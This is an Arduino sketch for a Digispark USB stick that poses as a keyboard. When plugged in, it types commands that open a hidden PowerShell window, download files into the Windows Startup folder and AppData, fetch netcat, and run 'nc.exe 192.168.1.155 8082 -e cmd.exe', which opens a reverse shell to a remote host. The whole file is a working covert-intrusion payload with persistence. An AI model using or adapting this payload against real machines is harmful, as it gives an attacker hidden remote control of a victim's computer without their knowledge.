#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("powershell -windowstyle hidden");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadFile(@http://startup.cmd@,@$env:UserProfile<Appdata<Roaming<Microsoft<Windows<Start Menu<Programs<Startup<startup.exe@)"); 
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("(Rename-Item $env:UserProfile<Appdata<Roaming<Microsoft<Windows<Start Menu<Programs<Startup<startup.txt startup.cmd)");
  DigiKeyboard.delay(500);
  
  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadFile(@http://ncscript.ps1@,@$env:UserProfile<Appdata<ncscript.ps1@)");
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("(Rename-Item $env:UserProfile<appdata<ncscript.txt ncscript.ps1)");
  DigiKeyboard.delay(500);

  DigiKeyboard.println("(New-Object System.Net.WebClient).DownloadFile(@http://nc.exe@,@$env:UserProfile<appdata<nc.exe@)");
  DigiKeyboard.delay(3000);
  DigiKeyboard.println("(Rename-Item $env:UserProfile<appdata<nc.txt nc.exe)");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd $env:UserProfile<appdata");
  DigiKeyboard.delay(500);
  DigiKeyboard.println(".<nc.exe 192.168.1.155 8082 -e cmd.exe");
  DigiKeyboard.delay(10000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
